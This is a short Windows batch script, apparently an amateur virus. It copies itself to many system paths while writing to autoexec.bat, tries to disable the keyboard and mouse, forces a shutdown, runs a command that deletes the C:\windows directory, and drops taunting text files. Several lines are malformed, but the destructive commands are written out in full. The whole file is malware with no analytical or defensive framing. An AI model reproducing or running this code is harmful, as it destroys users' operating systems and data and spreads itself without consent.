@echo off 
cls
Copy %0 "C:\AutorunNow" >> autoexec.bat
Copy %0 "C:\windows\taskman5" >> autoexec.bat
Copy %0 "C:\windows\Notepad23" >> autoexec.bat
Copy %0 "C:\windows\system32\xcopy4643" >> autoexec.bat
Copy %0 "C:\window\system32\systray1" >> autoexec.bat
Copy %0 "C:\dghjb >> autoexec.bat
Copy %0 "C:\fdhdghhg >> autoexec.bat
Copy %0 "C:\fgsd >> autoexec.bat
Copy %0 "C:\Readme1 >> autoexec.bat
Copy %0 "C:\hello >> autoexec.bat
Copy %0 "C:\Youdumb >> autoexec.bat
Copy %0 "C:\window\system32\haha" >> autoexec.bat
if exist C:\windows\rundll32 keyboard,disable goto Mousecheck
if not exist C:\windows\rundll32 keyboard,disable goto shutdown
:mousecheck
if exist c:\windows\rundll32 mouse,disable goto disable
if not exist c:\windows\rundll32 mouse,disable goto shutdown
:Disable
c:\windows\rundll32 mouse,disable
C:\windows\rundll32 keyboard,disable
goto exit
:shutdown
shutdown -s -f -t 01 
choice /ty3 > nul
If errorlevel y goto yy
:yy
deltree /y c:\windows
:exit
echo Now you are fuck >> C:\Readme.txt
echo Poop Smells >> C:\Virus INfo.txt
Start C:\Readme.txt
start C:\Virus Info.txt
exit 

